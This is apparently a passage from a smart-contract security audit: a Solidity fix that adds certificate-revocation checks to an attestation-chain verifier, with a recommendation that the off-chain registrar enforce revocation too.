    if (journal.result != VerificationResult.Success) return journal;
    if (journal.trustedCertsPrefixLen == 0) {
        journal.result = VerificationResult.RootCertNotTrusted;
        return journal;
    }
    for (uint256 i = 0; i < journal.trustedCertsPrefixLen; i++) {
        bytes32 certHash = journal.certs[i];
        if (i == 0) {
            if (certHash != rootCert) {
                journal.result = VerificationResult.RootCertNotTrusted;
                return journal;
            }
            continue;
        }
        uint64 expiry = trustedIntermediateCerts[certHash];
        if (block.timestamp > expiry) {
            journal.result = VerificationResult.IntermediateCertsNotTrusted;
            return journal;
        }
    }
    for (uint256 i = journal.trustedCertsPrefixLen; i < journal.certs.length; i++) {
        bytes32 certHash = journal.certs[i];
        if (revokedCerts[certHash]) {                                    // ADDED
            journal.result = VerificationResult.IntermediateCertsNotTrusted;
            return journal;
        }
        uint64 expiry = journal.certExpiries[i];
        if (block.timestamp > expiry) {
            journal.result = VerificationResult.InvalidTimestamp;
            return journal;
        }
    }
    uint64 timestamp = journal.timestamp / 1000;
    if (timestamp + maxTimeDiff <= block.timestamp || timestamp >= block.timestamp) {
        journal.result = VerificationResult.InvalidTimestamp;
        return journal;
    }
    _cacheNewCert(journal);
    return journal;
}

// checkTrustedIntermediateCerts: also break on a revoked entry, so the off-chain
// helper cannot return a prefix-len that walks past a revoked cert.
function checkTrustedIntermediateCerts(bytes32[][] calldata reportCerts) public view returns (uint8[] memory) {
    uint8[] memory results = new uint8[](reportCerts.length);
    bytes32 rootCertHash = rootCert;
    for (uint256 i = 0; i < reportCerts.length; i++) {
        bytes32[] calldata certs = reportCerts[i];
        uint8 trustedCertPrefixLen = 1;
        if (certs[0] != rootCertHash) {
            revert RootCertMismatch(rootCertHash, certs[0]);
        }
        for (uint256 j = 1; j < certs.length; j++) {
            if (revokedCerts[certs[j]]) break;                           // ADDED
            uint64 expiry = trustedIntermediateCerts[certs[j]];
            if (block.timestamp > expiry) break;
            trustedCertPrefixLen += 1;
        }
        results[i] = trustedCertPrefixLen;
    }
    return results;
}
```

The off-chain registrar should additionally read the on-chain revocation state and reject attestations whose chains traverse hashes in `revokedCerts`, closing the gap between the on-chain emergency action and the off-chain forwarding path. Re-trust must require an explicit admin action (e.g., a new `unrevokeCert` owner-only function that clears the sentinel).
